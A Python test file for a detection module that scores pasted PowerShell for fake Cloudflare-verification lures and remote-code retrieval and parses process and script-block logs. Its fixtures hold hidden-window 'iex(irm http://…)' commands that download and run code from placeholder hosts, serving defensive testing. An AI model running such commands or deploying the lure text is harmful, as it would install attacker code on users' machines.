"""Paste-and-run observer: fixtures only — no live clipboard, no live kills."""

from agent.engine.catalogs import options_for
from agent.engine.watch import observation_from_paste_run
from agent.modules import paste_run_guard as pr


def test_score_terminalfix_lure_with_retrieve():
    text = (
        "Clear-Host; Write-Host 'Starting Cloudflare verification…'; "
        "iex(irm 'http://203.0.113.9/x'); Expand-Archive -Path C:\\ProgramData\\z.zip"
    )
    score, tags = pr.score_script(text)
    assert "cloudflare_lure" in tags
    assert "remote_retrieve" in tags
    assert score >= 6


def test_benign_noprofile_not_scored_high():
    score, tags = pr.score_script("powershell.exe -NoProfile -Command Get-Date")
    assert score < 3
    assert "cloudflare_lure" not in tags


def test_parse_process_transcript_emits_fact():
    stdout = (
        "PROC:4242|powershell.exe|powershell -w hidden -c iex(irm http://203.0.113.10/a)\n"
        "PROC_STATUS:OK\n"
    )
    cov, detail, facts = pr.parse_process_transcript(stdout)
    assert cov == "complete"
    assert facts and facts[0]["process_name"] == "powershell.exe"
    assert "remote_retrieve" in facts[0]["tags"]


def test_access_denied_is_partial_not_safe():
    cov, detail, facts = pr.parse_process_transcript("PROC_STATUS:ACCESS_DENIED\nPROC_DETAIL:denied\n")
    assert cov == "partial"
    assert facts == []
    assert "access denied" in detail.lower()


def test_scriptblock_unavailable_when_log_missing():
    cov, detail, facts = pr.parse_scriptblock_transcript("SB_STATUS:UNAVAILABLE\nSB_DETAIL:No events\n")
    assert cov == "unavailable"
    assert facts == []


def test_observation_and_catalog():
    fact = {
        "subject": "paste_run:abc123",
        "snippet": "Write-Host Cloudflare verification; iex(irm http://x)",
        "tags": ["cloudflare_lure", "remote_retrieve"],
        "score": 7,
        "channel": "script_block_4104",
    }
    obs = observation_from_paste_run(fact)
    assert obs is not None
    assert obs.pillar == "safety"
    assert obs.kind == "paste_run_suspicion"
    assert "clipboard" in obs.why_it_matters.lower()
    opts = options_for("safety", "paste_run_suspicion")
    assert any(o.id == "show_why" for o in opts)
    assert all(o.handler != "clipboard.read" for o in opts if o.handler)
